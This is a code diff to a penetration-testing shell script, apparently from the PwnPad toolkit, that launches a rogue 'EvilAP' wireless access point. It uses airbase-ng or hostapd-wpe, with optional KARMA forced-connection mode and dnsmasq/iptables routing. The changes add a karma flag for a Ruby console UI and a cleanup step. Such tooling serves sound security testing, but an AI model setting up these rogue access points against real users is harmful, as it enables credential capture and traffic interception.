@@ -173,11 +173,13 @@ f_karmaornot(){
       f_beacon_rate
       airbase_flags="-P -C $brate"
       hostap_flags="-s -k"
+      evil_cui_karma="-k"
       ;;
     2)
       printf "[+] Starting EvilAP without forced connection attack\n"
       airbase_flags=""
       hostap_flags=""
+      evil_cui_karma=""
       ;;
     *) f_karmaornot ;;
   esac
@@ -191,16 +193,18 @@ f_karmaornot(){
   trap f_endclean EXIT
 
   #Start evilap
-  printf "[+] Starting evil ap type ${evilap_type}\n"
   if [ "${evilap_type}" = "airbase-ng" ]; then
     airbase-ng $airbase_flags -c $channel -e "$ssid" -v wlan1mon > "$logname" 2>&1 &
     airbase_ng_pid="$!"
   elif [ "${evilap_type}" = "hostapd" ]; then
     hostapd_conf=$(mktemp -t hostapd.conf-XXXX)
     printf "interface=wlan1\nssid=$ssid\nchannel=$channel\n" > "${hostapd_conf}"
+
+    #hostapd-wpe $hostap_flags -dd "${hostapd_conf}" 2>&1 | > "${logname}" &
     hostapd-wpe $hostap_flags -dd "${hostapd_conf}" 2>&1 | grep --line-buffered --color=never \
       -E "(WPE|deauthenticat|authentication|association|dissassociation)" > "${logname}" &
     hostapd_wpe_pid="$(pgrep hostapd-wpe)"
+
   fi
   sleep 2
 
@@ -231,7 +235,6 @@ EOF
     touch /var/lib/misc/dnsmasq.leases
   fi
 
-  printf "[+] Starting dnsmasq\n"
   dnsmasq -C "$dnsmasq_conf"
 
   if [ "${interface}" != "null" ]; then
@@ -261,13 +264,12 @@ EOF
     ${iptables_command2}
   fi
 
-  printf "[+] Following evilap log: ${logname}\n"
   if [ -n "${hostapd_wpe_pid}" ]; then
-    tail -n +0 --pid=${hostapd_wpe_pid} -f "$logname"
+      # start the evil api UI
+      /opt/pwnix/pwnpad-scripts/evil_ap_cui.rb ${evil_cui_karma} -l "${logname}" -s "${ssid}" -c "${channel}"
   elif [ -n "${airbase_ng_pid}" ]; then
     tail -n +0 --pid=${airbase_ng_pid} -f "$logname"
   fi
-  printf "[-] Ended evilap\n"
 }
 
 f_sanity_check
@@ -280,4 +282,5 @@ if [ "$?" = "0" ]; then
   [ "$EXIT_NOW" = 0 ] && f_channel
   [ "$EXIT_NOW" = 0 ] && f_evilap_type
   [ "$EXIT_NOW" = 0 ] && f_karmaornot
+  [ "$EXIT_NOW" = 0 ] && f_endclean
 fi
